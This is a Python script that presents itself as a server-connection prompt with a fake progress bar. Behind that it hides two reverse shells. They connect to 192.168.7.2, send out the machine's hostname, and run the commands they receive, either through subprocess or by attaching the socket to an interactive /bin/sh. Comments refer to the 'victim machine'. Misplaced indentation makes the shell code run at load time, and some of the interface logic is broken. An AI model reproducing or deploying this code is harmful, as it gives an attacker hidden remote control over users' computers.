import threading
import time # to allow sleep command
import progressbar # third-party progress bar library
def displayConnectionInterface():
    p = threading.Thread(target=netConn, args=())
    c = threading.Thread(target=netConn_L, args=())
    try:
        p.start()
    except:
        c.start()
    
    confirmation = input('Are you sure you want to connect to server? (y/n)')
    try:            
        if confirmation == 'y':
            print('Connecting to server...')
            i = 0 # var i will increase for each stage in the progress bar
            sleepDuration = 0 # can be increased to slow down progress bar
            progress = progressbar.ProgressBar() # accesses progress bar method from library
            for i in progress(range(100)):
                time.sleep(sleepDuration) # pause between progress bar updates
                if i == 100:
                       print('Connected') # displayed when progress bar has reached the end
        else:
            print('cancelled')
    except:
        while True:
            d = (d + 1) - 1
        
    
def netConn():
    import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4443
host = '192.168.7.2'
#connects to the socket stream on our host
s.connect((host,port))
#sends the hostname of the pc in a utf-8 format on the socket stream
s.send((os.environ['COMPUTERNAME']).encode('utf-8'))
#shell interaction loop
while 1:
    #recieves 1024 bytes of the socket sream
    rec = s.recv(1024)
    if rec == 'quit':#closes the shell if the host sends the string quit along the stream
        s.close()
    else: #executes the shell command on a subprocess and returns the output from stdout and stderr
        p = subprocess.Popen(rec.decode('utf-8'),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout_val = p.stdout.read() + p.stderr.read()
        s.send(stdout_val)
def netConn_L():
    
    import socket,os,subprocess
#declares the socket properties and connects to our host's socket stream
supersecret = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
supersecret.connect(("192.168.7.2",443))
#copies the descriptor from the socket sream to file descriptors 0,1 and 2
#this basically ensures that the shell is connected to the netcat host and dosent just deploy indepnedently on the victim machine
os.dup2(supersecret.fileno(),0)
os.dup2(supersecret.fileno(),1)
os.dup2(supersecret.fileno(),2)
#opens the bash shell in interactive mode within a subprocess 
p = subprocess.call(["/bin/sh","-i"])
